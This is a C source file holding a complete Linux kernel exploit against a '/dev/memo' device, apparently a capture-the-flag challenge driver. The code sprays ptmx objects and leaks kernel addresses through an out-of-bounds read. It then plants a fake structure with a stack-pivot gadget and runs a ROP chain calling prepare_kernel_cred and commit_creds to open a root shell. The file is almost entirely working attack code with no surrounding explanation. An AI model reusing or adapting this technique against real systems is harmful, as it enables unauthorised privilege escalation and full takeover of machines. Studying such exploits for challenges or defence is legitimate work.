#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <string.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEBUG(str) write(2, str, sizeof(str))

char stack[0x400];

unsigned long user_cs, user_ss, user_rflags;

// stolen from vitaly nikolenko's blog post
static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

void shell(void)
{
	const char *args[] = {"/bin/sh", 0};
	const char *envs[] = {0};

	DEBUG("[!] Should be root\n");
	execve(args[0], args, envs);
}

void main(void)
{
	char buffer[0x400];
	char fake[0x400];
	int fdm, fdp;

	save_state();

	DEBUG("[*] Spraying pool\n");
	for(int i = 0; i < 0x10; i++)
		open("/dev/ptmx", O_RDWR);

	DEBUG("[*] Opening objects\n");
	if(0 > (fdm = open("/dev/memo", O_RDWR))) {
		DEBUG("[!] Could not open memo\n");
		exit(1);
	}

	if(0 > (fdp = open("/dev/ptmx", O_RDWR))) {
		DEBUG("[!] Could not open ptmx\n");
		exit(1);
	}


	DEBUG("[*] Leak memory\n");
	lseek(fdm, 0x3FF, SEEK_SET);
	read(fdm, buffer, sizeof(buffer));
	//write(1, buffer + 1, sizeof(buffer));

	void *pool = ((void**)(buffer + 1))[7] - 0x38 - 0x400;
	void *base = ((void**)(buffer + 1))[3]; // rodata 0xffffffff81e65900
	long  offset = (long)base - 0xffffffff81e65900;

    printf("[+] pool = %p\n", pool);


	/* ghetto memset */
	for(int i = 0; i < sizeof(fake); i++)
		fake[i] = 0;


#define PIVOT  (void*)(0xffffffff815a98f4llu + offset) // push rcx, pop... rsp
#define POPRSP (void*)(0xffffffff818aaa78llu + offset) // pop rsp
#define POPRDI (void*)(0xffffffff8195c042llu + offset) // pop rdi
#define POPRSI (void*)(0xffffffff81962889llu + offset) // pop rsi
#define POPRDX (void*)(0xffffffff8173208dllu + offset) // pop rdx
#define POPRCX (void*)(0xffffffff810631d2llu + offset) // pop rcx
#define MOVRDI (void*)(0xffffffff81019dcbllu + offset) // mov rdi, rax ; rep movs

#define PKC    (void*)(0xffffffff8107bb50llu + offset) // prepare_kernel_cred
#define CK     (void*)(0xffffffff8107b8b0llu + offset) // commit_creds
#define IRET   (void*)(0xffffffff81a00a45llu + offset) // return to user land

#define LOOP   (void*)(0xffffffff81000218llu + offset) // infinite loop
#define RET    (void*)(0xffffffff8165f10dllu + offset) // ret for bp

	/* offset */
	int x = 50;

	for(int i = 0; i < x; i++)
		((void**)fake)[i] = 0xdeadbeef0000;

	/* Prepare the structure with close */
	((void**)(buffer + 1))[3] = pool;
    ((void**)fake)[4] = PIVOT; // close
	// ((void**)fake)[4] = 0xdeadbeef; // close

	/* second-stage pivot */
	((void**)(buffer + 1))[0x40 + 1] = POPRSP;
	((void**)(buffer + 1))[0x40 + 2] = pool + 8 * x;

	/* ROP chain */

	/* get root */
	((void**)fake)[x++] = POPRDI;
	((void**)fake)[x++] = 0;

	((void**)fake)[x++] = PKC;

	((void**)fake)[x++] = POPRCX;
	((void**)fake)[x++] = 0;
	((void**)fake)[x++] = MOVRDI;

	((void**)fake)[x++] = CK;


	((void**)fake)[x++] = RET; // breakpoint here
	((void**)fake)[x++] = IRET;
	((void**)fake)[x++] = 0xDEADBEEF; // rdi
	((void**)fake)[x++] = 0xCAFEBABE; // discarded

	/* iret: rip, cs, flags, stack, ss */
	((void**)fake)[x++] = shell;
	((void**)fake)[x++] = (void*)user_cs; // always 0x33
	((void**)fake)[x++] = (void*)user_rflags; // 0x200 is good enough
	((void**)fake)[x++] = (void*)fake; // reuse for stack
	((void**)fake)[x++] = (void*)user_ss; // always 0x2b

	DEBUG("[+] Upload structure to kernel\n");
	lseek(fdm, 0, SEEK_SET);
	write(fdm, fake, 0x3FF);
	write(fdm, buffer, sizeof(buffer));


	DEBUG("[+] Trigger payload\n");
	close(fdp);

	exit(0);
}
